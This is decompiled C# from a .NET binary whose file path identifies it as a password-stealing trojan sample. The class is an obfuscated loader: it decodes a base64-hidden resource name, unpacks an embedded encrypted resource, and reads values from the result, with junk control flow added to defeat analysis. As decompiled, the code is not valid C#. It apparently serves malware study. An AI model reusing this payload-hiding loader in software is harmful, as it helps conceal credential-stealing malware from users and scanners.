// Decompiled with JetBrains decompiler
// Type: Ajowans.TemplateService
// Assembly: Ajowans, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B9451E92-9872-44E9-A53B-32BF899B0E6F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.Win32.Stealer.gen-ca27c07cc9fddcd8bc07b2b9aa3406ab019fb54797bf2163b190217e9c17ce6a.exe

using System;
using System.Reflection;
using System.Text;

namespace Ajowans
{
  internal class TemplateService
  {
    internal static readonly byte[] pathList;
    internal readonly int pathList;
    internal readonly int generatorCache;

    static TemplateService()
    {
      if (TemplateService.pathList != null)
        return;
label_1:
      switch (3)
      {
        case 0:
          goto label_1;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (TemplateService.\u002Ecctor);
          }
          byte[] bytes = Convert.FromBase64String("QWpvd2FucyU=");
          string name = Encoding.UTF8.GetString(bytes, 0, bytes.Length);
          TemplateService.pathList = VectorProvider.RegisterFile(97L, Assembly.GetExecutingAssembly().GetManifestResourceStream(name));
          break;
      }
    }

    internal static int RegisterFile(int pathList) => BitConverter.ToInt32(TemplateService.pathList, pathList);

    internal static long RegisterFile(int pathList) => BitConverter.ToInt64(TemplateService.pathList, pathList);

    internal static float RegisterFile(int pathList) => BitConverter.ToSingle(TemplateService.pathList, pathList);

    internal static double RegisterFile(int pathList) => BitConverter.ToDouble(TemplateService.pathList, pathList);

    internal static void RegisterFile(Array pathList, int generatorCache)
    {
      int count;
      if (((int) TemplateService.pathList[generatorCache] & 128) == 0)
      {
label_1:
        switch (1)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (TemplateService.RegisterFile);
            }
            count = (int) TemplateService.pathList[generatorCache];
            ++generatorCache;
            break;
        }
      }
      else if (((int) TemplateService.pathList[generatorCache] & 64) == 0)
      {
label_6:
        switch (5)
        {
          case 0:
            goto label_6;
          default:
            count = ((int) TemplateService.pathList[generatorCache] & -129) << 8 | (int) TemplateService.pathList[generatorCache + 1];
            generatorCache += 2;
            break;
        }
      }
      else
      {
        count = ((int) TemplateService.pathList[generatorCache] & -193) << 24 | (int) TemplateService.pathList[generatorCache + 1] << 16 | (int) TemplateService.pathList[generatorCache + 2] << 8 | (int) TemplateService.pathList[generatorCache + 3];
        generatorCache += 4;
      }
      if (count < 1)
      {
label_10:
        switch (6)
        {
          case 0:
            goto label_10;
        }
      }
      else
        Buffer.BlockCopy((Array) TemplateService.pathList, generatorCache, pathList, 0, count);
    }
  }
}
